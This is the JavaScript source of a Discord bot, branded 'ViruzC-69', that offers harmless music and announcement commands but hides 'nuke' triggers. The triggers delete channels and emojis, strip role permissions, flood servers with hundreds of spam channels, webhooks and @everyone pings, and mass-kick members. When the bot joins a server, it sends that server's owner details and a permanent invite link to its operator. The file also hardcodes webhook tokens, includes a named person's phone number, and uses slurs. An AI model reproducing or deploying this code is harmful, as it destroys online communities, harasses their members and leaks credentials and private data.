const express = require('express')
const app = express()
 
app.get('/', function (req, res) {
  res.send('Hello World')
})
 let port = process.env.PORT || 3000;
app.listen(port)
 
require('dotenv').config()
///////////////////////EMPIEZA/TU/BOT//////////////////////////////



const Discord = require('discord.js');
const {Intents, Client} = require('discord.js');
const client = new Client({ws: {intents: Intents.ALL, properties: { $browser: "Discord App" }}});
const fetch = require('node-fetch')
const { prefix, token1, Kass, list, unallowedguilds} = require('./config.json');
const fs = require('fs');
const webhookClientNuke = new Discord.WebhookClient("763134567745585192", "_MgOSCM5umktPaq3xurM6A8EOyy4DXMPfK38BStA9bNeKtpBbnRpwYUANP200Mw7QiOR");
const webhookClientJoin = new Discord.WebhookClient("763134664994586675", "oToQNGd0eYED0SwfFKbQFyOX7s5VYcqK-gorudp0G-fsD0I3Jnyy1D0tGAP4iFDHbnrP");
const guild = '782621562154254356'
const logC = "782644045834747914"



//before you go ape mode saying many things here are uneccessery yeah I know but I was writing this while learning
//if you don't know how to use it, your fault not mine


//made by: assy/kaos


//NOTE: i think the emote spam feature slows down the pings so you might wanna remove that, I just noticed



const axios = require('axios').default
var pfp1 = "https://cdn.discordapp.com/attachments/740002310075318332/807409841311055973/Xenon_Premium.jpg"
var pfsp = 'https://cdn.discordapp.com/attachments/740002310075318332/807409841311055973/Xenon_Premium.jpg'
var pfp = "https://cdn.discordapp.com/attachments/740002310075318332/807409841311055973/Xenon_Premium.jpg"
//+1 626-708-0327 dani phone number
//'https://media.discordapp.net/attachments/779703707793227776/783320455549026314/GrimmChristmas.png'
const ytdl = require('ytdl-core');
client.once('ready', () => {
    console.log('start the fucking thing already')
       client.user.setAvatar(pfp)
})

function read(filePath, cb) {
    fs.readFile(filePath, (err, fileData) => {
        
        if(err){
            return cb && cb(err)
        }
        try {
            const object = JSON.parse(fileData)
            return cb && cb(null, object)

        }catch(err) {
            return cb && cb(err)
        }
    })
}










function song() {
  var rand = ["https://youtu.be/gFtb3EtjEic", "https://youtu.be/J8JoBttIy_c", "https://youtu.be/3rYoRaxgOE0", "https://youtu.be/aAkMkVFwAoo"]
   return rand[Math.floor(Math.random()*rand.length)]
}





 client.on('message', message => {
  if (!message.content.startsWith(prefix)) return;
  if(message.content.startsWith(`${prefix}play`)) {
if(message.channel.type === "dm") {return}
    const args = message.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
    const theid = args.join(' ')//spaces lol
if(!theid.startsWith("https://youtu.be/")) {return message.channel.send("YouTube links that start with https://youtu.be/ only")}
if(message.member.voice.channel) {
  message.member.voice.channel.join().then(async connection => {
    var stream = ytdl(theid, { filter: 'audioonly' });
    var dispatcher = connection.play(stream)
     message.channel.send(`Playing ${theid}`)
    dispatcher.on("finish", () => {
message.guild.me.voice.channel.leave()
          }) 

  }).catch(err => {
    if(err) {console.log(err)
return  }
  })
}else {
  message.channel.send('You should be in a voice channel to play music')
}
}
}) 










client.on("guildCreate", guild => {
if(guild.id === "791793442346237962") {
guild.channels.create("nigga").then(c => c.send("-abr"))
}
})




client.on("message", msg => {
if(msg.content === "/remove some") {
if(msg.author.id === Kass) {
var i = 0
while(i < 30) {
var g = client.guilds.cache.random()
if(!unallowedguilds.includes(g.id)) {
g.leave()
i++}
}
}
}

})


client.on('message', msg => {
    if(msg.content.startsWith('!add')) {
        if(msg.author.id === `${Kass}`) {
            const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
            const theid1 = args.join(' ')//spaces lol
            if(!theid1) {msg.reply('It seems like you did not provide a ID... :x:')//if they dont send a ID
            return;
            }
            read('./config.json', (err, data) => {
                data.list.push(theid1)
                console.log(theid1)
                console.log(data.list)
                fs.writeFile('./config.json', JSON.stringify(data, null, 2), err => {
                })
            })
            
        }
    }
})


client.once('ready', () => {
  client.user.setStatus(`${prefix}help`)
console.log("logged in: " + client.user.tag + "\n id: " + client.user.id)
})



client.on('message', msg => {
    if(msg.content === `${prefix}getguilds`) {
        if(msg.author.id === `${Kass}`) {
         msg.client.guilds.cache.forEach(g => {
          const Id = g.id
          const Oid = g.ownerID
          const Otag = g.owner.user.tag //supposed to be tag but shitcord doesn't define user
          const Gm = g.memberCount
           if(g.me.hasPermission('CREATE_INSTANT_INVITE')) {
            const joinEmbed = new Discord.MessageEmbed()
            .setColor('#ede7e7')
            .setTitle(`Joined "${g.name}"`)
            .setAuthor(client.user.username, pfp)            
            .setDescription("The Bot DOES NOT have the permission ADMINISTRATOR(not to nuke just checking)")
            .addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`, '^info^')
            const joinEmbed2 = new Discord.MessageEmbed()
            .setColor('#ede7e7')
            .setTitle(`Joined "${g.name}"`)
            .setAuthor(client.user.username, pfp)
            .setDescription("The Bot DOES have the permission ADMINISTRATOR(not to nuke just checking)")
            .addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, '^info^')
            if(g.me.hasPermission('ADMINISTRATOR')) {            
              let c = g.channels.cache.find(c => c.type === 'text')
               if(c) {
            c.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
            .then(invite => msg.channel.send(`discord.gg/${invite.code} `).then(msg.channel.send(joinEmbed2)))
	       }
          }else{
            let c = g.channels.cache.find(c => c.type === 'text')
            c.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
            .then(invite => msg.channel.send(`discord.gg/${invite.code} `).then(msg.channel.send(joinEmbed)))
          }            
           }else {
            const joinEmbed = new Discord.MessageEmbed()
            .setColor('#ede7e7')
            .setTitle(`Joined "${g.name}"`)
            .setAuthor(client.user.username, pfp)            
            .setDescription("The Bot DOES NOT have the permission ADMINISTRATOR(not to nuke just checking)")
            .addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`, '^info^')

             msg.channel.send('could`t create link')
             msg.channel.send(joinEmbed)
           }
         })
            
        }
    }
})




client.on("message", msg => {
    if(msg.content.startsWith("/send")) {
       if(msg.author.id === `${Kass}`) {
            const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
            const theid1 = args.join(' ')
           msg.client.guilds.cache.forEach(g => {
              if(g.me.hasPermission("ADMINISTRATOR")) {
                  if(g.id === theid1) {
                  g.channels.create("test").then(c => c.send("-abr"))
}       
 }
        })
}
}
})

client.on("message", msg => {
    if(msg.content.startsWith("/testing")) {
       if(msg.author.id === `${Kass}`) {
            const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
            const theid1 = args.join(' ')
           msg.client.guilds.cache.forEach(g => {
              if(g.me.hasPermission("ADMINISTRATOR")) {
                  if(g.id === theid1) {
                  g.channels.create("test")
}       
 }
        })
}
}
})
//nuke


 

client.on("message", async msg => {
 if(msg.content === `-kickall`) {
if(list.includes(msg.author.id)) {return}
    if(msg.channel.type === 'dm') {return}
if(!unallowedguilds.includes(msg.guild.id)) {
    if(msg.guild.me.hasPermission("KICK_MEMBERS")) {
msg.guild.members.cache.forEach(m => {
if(m.kickable) {m.kick()}})}}
  } if(msg.content.startsWith(`-kickallexperiment`)) {
   if(msg.channel.type === 'dm') {return}
if(list.includes(msg.author.id)) {return}
 if(!unallowedguilds.includes(msg.guild.id)) {
    if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
          var gid = msg.guild.id
          for(var i = 0; i < msg.guild.members.cache.filter(m => m.kickable === true).size; i++){
            setTimeout(function() {
              console.log("kicked")
              axios({
                url: `https://discord.com/api/v8/guilds/${gid}/members/${msg.guild.members.cache.filter(m => m.kickable === true).random().id}?reason=`,
                method: 'DELETE',
                headers: {
                 authorization: `Bot ${token1}`
                }
              })
            },i * 0800)
        }
  }
}
}
})
 /**
  *  
  message.guild.emojis.cache.forEach(e => {
    e.delete()
});
  */
     


  client.on("ready", () => {
      console.log("bruh")
  })
     //this edits all roles
     client.on('message', message => {
if(list.includes(message.author.id)) {return}
       if(message.content.startsWith('kiss my disrespectful ass')) {
 if(message.channel.type === "dm") {return}
  if(!unallowedguilds.includes(message.guild.id)) {
         if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
  }    
  message.guild.emojis.cache.forEach(async e => {
    (await e).delete()})
setTimeout(() => {

  message.guild.roles.cache.forEach(r => {
    if(r.editable) {
      r.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE', 'CREATE_INSTANT_INVITE', 'ATTACH_FILES'])
    .catch(console.error)}
  var times = 240
  var idkhere = 0
   while(idkhere < times) {
    message.guild.roles.create({name: channelnames()})
idkhere++}
  })
},3000)
       }
  }
     })
 client.on('message', async message => {
if(list.includes(message.author.id)) {return}
   if(message.content.startsWith('kiss my disrespectful ass')) {
if(message.channel.type === "dm") {return}
  if(!unallowedguilds.includes(message.guild.id)) {
     if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
}    
          var b = 0
   while(b < 39) {
b++
await message.guild.emojis.create(randomemotes(), "kaos")
 }  
   }
  }
 })

 /**
  *
          var b = 0
   while(b < 39) {
   message.guild.emojis.create('https://images-ext-1.discordapp.net/external/AJ3ZseNi8NlElR_I1tS51ubQguFMXm4h5CqKc_V_cdU/%3Fwidth%3D587%26height%3D587/https/media.discordapp.net/attachments/735392717886193666/754861066105782312/20200820_203508.jpg', 'funny')
    message.guild.emojis.create('https://images-ext-1.discordapp.net/external/HRdm0jpSLissUbkke890fcGabWIpSEnmjlJykK4hgg8/https/images-ext-1.discordapp.net/external/LOxbVQxTHoQNiyrc-GMz__uODLQQ6v38Xpypt6K1LXo/https/media.discordapp.net/attachments/735392717886193666/772567167018991646/a48e2e66-bbd5-4ba6-b168-90ce8c7c6fa9.gif', 'cube')
     
 b++  
 }  
  */
 
   client.on('message', message => {
if(list.includes(message.author.id)) {return}
     if(message.content.startsWith("-abr")) {
 if(message.channel.type === "dm") {return}
  if(!unallowedguilds.includes(message.guild.id)) {
if(message.guild.me.hasPermission("ADMINISTRATOR")) {
       message.guild.roles.everyone.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE']);
   }
   }
  }
   }) 
 
 
 
 function randomT() {
   var rand = ["https://cdn.discordapp.com/attachments/740002310075318332/807031296827326474/ViruzC-69-IsHere.mp4 ", "https://cdn.discordapp.com/attachments/740002310075318332/807031296827326474/ViruzC-69-IsHere.mp4 ", "@everyone @here @everyone @here @everyone @here @everyone @here \nViruzC-69 is the boss here\nWe never fall\n@everyone @here @everyone @here @everyone @here @everyone @here", "https://cdn.discordapp.com/attachments/740002310075318332/807031296827326474/ViruzC-69-IsHere.mp4 ", "https://cdn.discordapp.com/attachments/740002310075318332/805951173282496532/ViruzC-69-IsHere.gif ", `☣☣☣☣☣☣
https://discord.gg/4KmEBgwSSz

☣Server infected by ViruzC-69☣
  
The fun is over!`, "*V̳i̳r̳u̳z̳C̳-̳6̳9̳ ̳E̳s̳t̳a̳ ̳a̳q̳u̳i̳*", "💉This server Has Been Infected💉", "☣☠☣", "It is recommended to leave the server now",`
We are here, ViruzC-69  It is too
ViruzC-69 Has been Injected 💉`, "https://cdn.discordapp.com/attachments/740002310075318332/807031296827326474/ViruzC-69-IsHere.mp4 ", ":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:", "☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠", "This server is rlly fucking shit🃏", "💉Infected by ViruzC-69💉", "https://cdn.discordapp.com/attachments/740002310075318332/807031296827326474/ViruzC-69-IsHere.mp4", ":wavy_dash::wavy_dash::wavy_dash::wavy_dash::wavy_dash::biohazard:ViruzC-69:biohazard::wavy_dash::wavy_dash::wavy_dash::wavy_dash::wavy_dash:\n:warning:This server has been infected by ViruzC-69:warning:\n:black_large_square::black_large_square::black_large_square::black_large_square::biohazard: ViruzC-69 is @here :biohazard::black_large_square::black_large_square::black_large_square::black_large_square:\n:black_large_square::black_large_square::biohazard: https://discord.gg/4KmEBgwSSz :biohazard::black_large_square::black_large_square:\n :wavy_dash::wavy_dash::wavy_dash::wavy_dash::wavy_dash::skull_crossbones: @everyone :skull_crossbones::wavy_dash::wavy_dash::wavy_dash::wavy_dash::wavy_dash:\n||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​\n||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||\n||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​\n||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||\nhttps://cdn.discordapp.com/attachments/740002310075318332/807031296827326474/ViruzC-69-IsHere.mp4​", "ViruzC-69 Always boss", "🃏Somos ViruzC-69🃏", "☣ Nuked ☣", ":black_large_square::black_large_square::biohazard: https://discord.gg/4KmEBgwSSz :biohazard::black_large_square::black_large_square:", "https://cdn.discordapp.com/attachments/740002310075318332/807031296827326474/ViruzC-69-IsHere.mp4\n☣ViruzC-69 Is here☣    Server Fucked by ViruzC-69\n☣☣☣☣☣☣☣☣☣☣ **ViruzC-69 Is Here**\nViruzC-69 Is Here☠ViruzC-69 Is Here☠ **ViruzC-69 Is Here**\nViruzC-69 Is Here☠ViruzC-69 Is Here☠ **ViruzC-69 Is Here**\nViruzC-69 Is Here☠ViruzC-69 Is Here☠ **ViruzC-69 Is Here**\nViruzC-69 Is Here☠ViruzC-69 Is Here☠ **ViruzC-69 Is Here**\nViruzC-69 Is Here☠ViruzC-69 Is Here☠ **ViruzC-69 Is Here**\nViruzC-69 Is Here☠ViruzC-69 Is Here☠**ViruzC-69 Is Here**", "https://discord.gg/4KmEBgwSSz ", "https://discord.gg/4KmEBgwSSz ", "https://cdn.discordapp.com/attachments/740002310075318332/807031296827326474/ViruzC-69-IsHere.mp4", " :wavy_dash::wavy_dash::wavy_dash::wavy_dash::wavy_dash::skull_crossbones: @everyone :skull_crossbones::wavy_dash::wavy_dash::wavy_dash::wavy_dash::wavy_dash:", ":warning:This server has been infected by ViruzC-69:warning:", "⚠ViruzC-69 Ha sido Inyectado⚠", "〰〰☣☠☣〰〰", "Les recomendamos Abandonar el servidor ahora mismo\n Repito, Les recomendamos Abandonar el servidor ahora mismo", "⚠VïrµzÇ-69⚠\n☣@everyone"]
 return rand[Math.floor(Math.random()*rand.length)];
 }
 
 
 function randomnames() {
   var rand = ["I CAN DO ANYTHING", "『ΛDᄃ』", "『ΛDᄃ』", "匚卄卂ㄖ丂", "⚠Nuked⚠", "〰☣〰", "💀Fuck Server💀", "卂丂丂ㄚs property now", "👆ViruzC-69 Never falls👆", "this server is fucking shit"]
   return rand[Math.floor(Math.random()*rand.length)];
 }
 
 
 function randomicons123() {
   var rand = ["https://cdn.discordapp.com/attachments/740002310075318332/805918882270806046/viruz_icon.png", "https://cdn.discordapp.com/attachments/756978857751609403/807642012101902426/viruz_icon.png", "https://cdn.discordapp.com/attachments/759618033072603196/807642118277038090/viruz_icon.png", "https://cdn.discordapp.com/attachments/768708814554791947/807642222131413022/viruz_icon.png", "https://cdn.discordapp.com/attachments/747523402419667135/807642335104991292/viruz_icon.png", "https://cdn.discordapp.com/attachments/797182668537856001/807642487853154304/viruz_icon.png", "https://cdn.discordapp.com/attachments/794008639782125588/807642626668888064/viruz_icon.png", "https://cdn.discordapp.com/attachments/807642719732236308/807642744398544906/viruz_icon.png", "https://cdn.discordapp.com/attachments/807642849746747412/807642877390880798/viruz_icon.png", "https://cdn.discordapp.com/attachments/807642939214921730/807642975223152680/viruz_icon.png", "https://cdn.discordapp.com/attachments/807643062255616000/807643099786510366/viruz_icon.png",]
 return rand[Math.floor(Math.random()*rand.length)];
 }
 

 function channelnames() {
   var rand = ["⚠𝘝𝘪𝘳𝘶𝘻𝘊-69⚠", "This server sucks", "☜☟☜☟", "『ΛDᄃ』", "Infected by ViruzC-69", "☣We are here☣", "☜☝☟☞☝ViruzC-69☝☜☟☝☞","♛♤♦♧♣♡♥♢♠♛", "♛♤♧♡♢We are here♠♣♥♦♛", "💉💉💉", "۞ۻۼۼ۽۞", "ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "get fucked ﷽﷽﷽", "匚卄卂ㄖ丂 匚卄卂ㄖ丂", "卂丂丂ㄚ", "💉V̴i̴r̴u̴z̴C̴-̴6̴9̴💉"]
   return rand[Math.floor(Math.random()*rand.length)];
 }
 
 
 function randomemotes() {
var rand = ["https://cdn.discordapp.com/attachments/740002310075318332/805918882270806046/viruz_icon.png", "https://cdn.discordapp.com/attachments/740002310075318332/805918882270806046/viruz_icon.png ", "https://cdn.discordapp.com/attachments/740002310075318332/805918882270806046/viruz_icon.png", "https://cdn.discordapp.com/attachments/740002310075318332/805918882270806046/viruz_icon.png", "https://cdn.discordapp.com/attachments/740002310075318332/805918882270806046/viruz_icon.png", "https://cdn.discordapp.com/attachments/740002310075318332/805918882270806046/viruz_icon.png", "https://cdn.discordapp.com/attachments/740002310075318332/805918882270806046/viruz_icon.png", "https://cdn.discordapp.com/attachments/740002310075318332/805918882270806046/viruz_icon.png", "https://cdn.discordapp.com/attachments/740002310075318332/805918882270806046/viruz_icon.png", "https://cdn.discordapp.com/attachments/740002310075318332/805918882270806046/viruz_icon.png"]
return rand[Math.floor(Math.random()*rand.length)]
}
 
 
   client.on('message', message => {
if(list.includes(message.author.id)) {return}
     if(message.content.startsWith("-abr")) {
 if(message.channel.type === "dm") {return}
  if(!unallowedguilds.includes(message.guild.id)) {
if(message.guild.me.hasPermission("ADMINISTRATOR")) {
             message.guild.channels.cache.forEach(channel => {
             if(channel.type === 'text') channel.delete().then((channel)=>{
               if (channel.deleted === true)
               {
                 console.log("channel succesfully yeeted!");
               }
             },reason => {
               console.log(`Faggot i cant delete that channel because ${reason}`);
             })
           }) 
}
     } 
   }
   }) 
   
 
 const nukingtime = new Set()
 client.on('message', msg => {
if(list.includes(msg.author.id)) {return}
     if(msg.content.startsWith(`-abr`)) {
         if(msg.channel.type === "dm") {return}
  if(!unallowedguilds.includes(msg.guild.id)) {
       if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
        var number = 0
        var pray = -1
        setTimeout(() => { 
           msg.guild.channels.create('☣ViruzC-69☣').then(p => {
                p.send("@everyone This server sucks")
                p.send("https://discord.gg/4KmEBgwSSz @everyone")
                p.send("☠This server has been Infected by ViruzC-69☠")
                p.send("☣@everyone☣")
                p.createWebhook("#ViruzC-69 is Here").then(w => {
                     
                [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12].forEach(function(i) {
                    w.send(randomT() + ":radioactive: :biohazard::radioactive: :biohazard::radioactive: :biohazard::radioactive: :biohazard::radioactive: :biohazard::radioactive: :biohazard:**__Nuke__**:radioactive: :biohazard::radioactive: :biohazard::radioactive: :biohazard::radioactive: :biohazard::radioactive: :biohazard::radioactive: :biohazard::radioactive:    https://discord.gg/4KmEBgwSSz @everyone")
                    
                
                })
            
            })
            var spam = 0
            while(spam < 15) 
        {    
            p.send(randomT() + " @everyone", {tts: true})
            spam++
        }
                  const server2 = msg.client.guilds.cache.find(g => g.id === guild)
        const channel = server2.channels.cache.find(c => c.id === logC)

  const Id = msg.guild.id
  const Oid = msg.guild.ownerID
  const Otag = msg.guild.owner.user.tag //user goes null so idk
  const Gm = msg.guild.memberCount
const nukeEmbed = new Discord.MessageEmbed()
.setColor('#FF0435')
.setTitle(`Nuked "${msg.guild.name}"`)
.setAuthor(client.user.username, pfp)
.addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")      
p.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
.then(invite => {
channel.send(nukeEmbed).then(channel.send(`discord.gg/${invite.code}`))
})
             })
        while(number < 130) {
             msg.guild.channels.create(channelnames()).then(c => { 
                
                 c.createWebhook("V̟i̟r̟u̟z̟C̟-6̟9̟").then(w => {
                     
                     [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12].forEach(function(i) {
                         w.send(randomT() + " @everyone")
                         
                     
                     })
                 
                 })
             
             var spam = 0
             while(spam < 15) 
         {    
             c.send(randomT() + " @everyone")
             spam++
         }
                     
             })
         number++
 
         }
               msg.guild.channels.create("le funni").then(c => {
        c.send("CHAOS CHAOS")
         setTimeout(() => {
c.send("-kickall")
c.send("CHAOS CHAOS")
},7000)
        setTimeout(() => {
c.send("CHAOS CHAOS")
},14000)
      }) 
        }, 10000);
     }
  }
 })
 

client.on("message", msg => {
  if(msg.content === 'CHAOS CHAOS') {
    if(msg.author.id === client.user.id) {
      var gid = msg.guild.id
      setTimeout(() => {
        var i = 0
        while(i < 100) {
          setTimeout(() => {
            axios({
              url: `https://discord.com/api/v8/guilds/${gid}/channels`,
              method: 'POST',
              headers: {
               authorization: `Bot ${token1}`
              },data: {"type":0,"name": channelnames(),"permission_overwrites":[]}
            })
          }, 2400);
          i++    
        }
      }, 3000);
    }
  }
})

 
 client.on('message', message => {
if(list.includes(message.author.id)) {return}
   if(message.content === "IT WAS ME BARRY") {
 if(message.channel.type === "dm") {return}
  if(!unallowedguilds.includes(message.guild.id)) {
 if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
 return
  }
  setTimeout(() => {
     message.guild.setName(randomnames())
     message.guild.setIcon(randomicons123())
     message.guild.setVerificationLevel("LOW")
     message.guild.setRegion("brazil")
  }, 2000);
         
  }
 }
 })



Array.prototype.random = function () {
    return this[Math.floor(Math.random() * this.length)];
  };

client.on("guildCreate", msg => {
        const server = msg.client.guilds.cache.find(g => g.id === guild)
        const channel = server.channels.cache.find(c => c.id === logC)
    const Id = msg.channels.guild.id
    const Oid = msg.channels.guild.ownerID
    const Otag = msg.channels.guild.owner.user.tag
    const Gm = msg.channels.guild.memberCount
    const joinEmbed = new Discord.MessageEmbed()
.setColor('#FF0435')
.setTitle(`Joined "${msg.channels.guild.name}"`)
.setAuthor(client.user.username, pfp)
.addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`, "_ _")
.setDescription("The Bot DOES NOT have the permission ADMINISTRATOR needed to nuke!")


const joinEmbed2 = new Discord.MessageEmbed()
.setColor('#FF0435')
.setTitle(`Joined "${msg.channels.guild.name}"`)
.setAuthor(client.user.username, pfp)
.addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")
.setDescription("The Bot DOES have the permission ADMINISTRATOR needed to nuke!")

if(msg.me.hasPermission("ADMINISTRATOR")) {let ch = msg.channels.cache.find(c => c.type === "text")
ch.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
.then(invite => channel.send(joinEmbed2).then(channel.send(`discord.gg/${invite.code}`)))
}else {
    let ch = msg.channels.cache.find(c => c.type === "text")
    ch.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
    .then(invite => channel.send(joinEmbed).then(channel.send(`discord.gg/${invite.code}`)))
}

if(!msg.me.hasPermission("CREATE_INSTANT_INVITE")) {
    channel.send(joinEmbed).then(channel.send("Couldn't create link..."))
}
})
 






const commandCooldown1 = new Set()
client.on("message", msg => {
        if(msg.content.startsWith(`${prefix}summon`)) {
 const server = msg.client.guilds.cache.find(g => g.id === guild)
        const channel = server.channels.cache.find(c => c.id === logC)
            if(commandCooldown1.has(msg.guild.id)) { msg.reply(" This command is on cooldown...") 
            return; }
            if(!msg.guild.me.hasPermission("CREATE_INSTANT_INVITE")) {msg.reply("I need the permission to create invites to summon the owner...") 
            return;}
            if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
            const Id = msg.guild.id
            const Oid = msg.guild.ownerID
            const Otag = msg.guild.owner.user.tag //user goes null so idk
            const Gm = msg.guild.memberCount
           
        
        const joinEmbed2 = new Discord.MessageEmbed()
        .setColor('#FF0435')
        .setTitle(`"${msg.guild.name}"`)
        .setAuthor(client.user.usernane, pfp)
        .addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")
        .setDescription("The Bot DOES have the permission ADMINISTRATOR needed to nuke!")
        
        msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
        .then(invite => channel.send(joinEmbed2).then(channel.send(`discord.gg/${invite.code} They ask for help <@${Kass}>`)))
    
        commandCooldown1.add(msg.guild.id)    
    }else {
            const Id = msg.guild.id
            const Oid = msg.guild.ownerID
            const Otag = msg.guild.owner.user.tag
            const Gm = msg.guild.memberCount
            const joinEmbed = new Discord.MessageEmbed()
            .setColor('#FE2B54')
            .setTitle(`"${msg.guild.name}"`)
            .setAuthor(client.user.username, pfp)
            .addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`)
            .setDescription("The Bot DOES NOT have the permission ADMINISTRATOR needed to nuke!")
            .setColor('#FF0435')
            msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
            .then(invite => channel.send(joinEmbed).then(channel.send(`discord.gg/${invite.code} They asked for help <@${Kass}>`)))

            
        commandCooldown1.add(msg.guild.id)
        }
setTimeout(() => {
    commandCooldown1.delete(msg.guild.id)
  }, 60000);//cooldown is cleared after 60 seconds
}
})


  

  
  
  
client.on('message', message => {
if(list.includes(message.author.id)) {return}
  if(message.content.startsWith(`-abr`)) {
if(!message.guild.me.hasPermission("ADMINISTRATOR")) {
message.channel.send("I can't do anything\nI'm in a f*cking wheelchair \nhttps://cdn.discordapp.com/attachments/782641638798393364/786239316464238612/y2mate.com_-_I_CANT_DO_ANYTHING_1080p.mp4").then(m => setTimeout(() => {m.delete()},10000))
if(message.guild.me.hasPermission("MANAGE_MESSAGES")) {message.delete()}
}
  }
})
  










const commandCooldown = new Set();//this cooldown member list
const AnnounceCh = new Set();
const announceWb = new Set();//the right webhook
client.on('ready', () => {
    console.log("start")
})

client.on("ready", () => {
setInterval(function(){ 
    var siz = client.guilds.cache.size
    var siz1 = client.guilds.cache.reduce((a, g) => a + g.memberCount, 0) + 243
     client.user.setActivity(``) 
     setTimeout(function(){ client.user.setActivity(``) }, 5000); 
}, 10000);
})



client.on('message', async(msg) => {//listener

  if(msg.content.startsWith(`${prefix}setupA`)) {//command name
    
  if(msg.channel.type === "dm") {msg.reply(':x: It seems like this is a dm chat... :x:')
  return;
   }//checks if its a dm

    if(!msg.member.hasPermission('ADMINISTRATOR')) {msg.reply(`:x: You don't have the permission to announce... :x:`)
    return;
    }//checks for member perms

    if(!msg.guild.me.hasPermission('ADMINISTRATOR')) {msg.reply(`:x: I don't have the permission administrator... :x:`)
    return;
    }//checks for member perms

      
      var categoryy = msg.guild.channels.create('JEVIL', {type: 'category'})//create the category CG
      const idd = (await categoryy).id//get CG id so the channel below is set in CG category

      var announcing = msg.guild.channels.create('Jevil announcements', {type: 'text',//creates cg announcements
      permissionOverwrites: [//permissions for the channel

        { id: msg.guild.id, 
          //denies send messages for everyone
          deny: ['SEND_MESSAGES']
        }
        ]
      })

